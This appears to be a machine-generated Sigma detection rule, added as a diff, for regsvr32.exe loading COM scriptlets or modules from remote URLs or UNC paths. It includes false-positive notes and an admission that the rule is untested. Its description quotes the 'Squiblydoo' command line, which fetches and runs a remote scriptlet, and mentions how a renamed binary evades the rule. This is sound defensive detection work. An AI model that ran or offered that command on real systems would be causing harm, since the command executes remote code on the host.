@@ -1,0 +1,62 @@
+title: Regsvr32 loading a scriptlet or a module from a remote path
+id: 2baac6bb-8880-47c8-961f-761591a44494
+status: experimental
+description: |
+  Takes the process-creation leg of AN0785 and splits regsvr32.exe executions
+  into the two shapes the analytic calls anomalous: a module named by URL or UNC
+  path rather than by a local file, and a COM scriptlet rather than a DLL. The
+  remote selection matches an http, https or ftp scheme on the command line — the
+  "Squiblydoo" form `regsvr32 /s /n /u /i:http://host/file.sct scrobj.dll`, which
+  registers nothing and only executes — or a UNC prefix, written as four
+  backslashes in the YAML because `\\` in Sigma is one literal backslash. The
+  scriptlet selection matches the scriptlet engine `scrobj.dll` and the `.sct`
+  extension, which is MITRE's ScriptletExtensions knob populated here with the
+  two strings that name the mechanism rather than a file type. Plain
+  `regsvr32 C:\path\thing.dll` is deliberately not a hit: registering a local DLL
+  is what the binary is for, and MITRE's AllowedDLLPaths knob exists precisely
+  because that traffic is constant. Two limits worth stating: a copy of
+  regsvr32.exe renamed before use escapes the `Image|endswith` gate, and the
+  analytic's other three log sources — Sysmon EventID 7 module loads and EventID
+  3/22 network and DNS events — are separate log sources that cannot be joined to
+  this one inside a single Sigma rule, so the unsigned-DLL and outbound-traffic
+  halves of the correlation are not expressed here.
+  The brief maps Security EventID 4688 onto Sigma's `process_creation` category,
+  which is Sysmon-shaped — this rule is written in that vocabulary (`Image`,
+  `CommandLine`), and a raw 4688 feed, whose native field name for the binary is
+  `NewProcessName`, needs the usual field mapping applied before it can match.
+  4688 also requires *Audit Process Creation*, and every selection here reads the
+  arguments, so it additionally requires the separate *Include command line in
+  process creation events* policy; without both, this rule returns zero rows, and
+  zero rows here means blind, not quiet.
+  UNVERIFIED AS AUTHORED — derived from MITRE ATT&CK DET0282, not hand-written and not tested by its author. Any lab result is on this rule's own page.
+references:
+  - https://attack.mitre.org/techniques/T1218/010
+  - https://attack.mitre.org/detectionstrategies/DET0282
+author: Siemphony pipeline (machine-derived from MITRE ATT&CK v19.2)
+date: 2026-08-17
+tags:
+  - attack.defense-evasion
+  - attack.t1218.010
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection_tool:
+    Image|endswith: '\regsvr32.exe'
+  selection_remote:
+    CommandLine|contains:
+      - 'http://'
+      - 'https://'
+      - 'ftp://'
+      - '\\\\'
+  selection_scriptlet:
+    CommandLine|contains:
+      - 'scrobj.dll'
+      - '.sct'
+  condition: selection_tool and (selection_remote or selection_scriptlet)
+falsepositives:
+  - "Application installers, repair routines and packaging scripts that register a COM component straight off a software distribution share, for example regsvr32 /s \\fileserver\\apps\\vendor\\control.dll. The UNC prefix is the whole of the signal in that leg, and in estates that deploy software from a file share this is the rule's highest-volume match by a wide margin — it is why the level is medium rather than high."
+  - "Legacy setup routines, vendor knowledge-base articles and helpdesk scripts that re-register the Windows Script Component runtime with regsvr32 scrobj.dll to repair a broken scriptlet association, which matches the scriptlet selection exactly with nothing remote involved."
+  - "Endpoint-management agents and logon scripts that register or unregister ActiveX controls and Office add-ins from a mapped network location during an application rollout, producing a burst of UNC-path matches across many hosts at the same time of day."
+  - "Developers and support staff registering a freshly compiled control directly from a UNC build-output path on a workstation, which produces the same event as a remote module load and is common on any machine used for COM development."
+level: medium
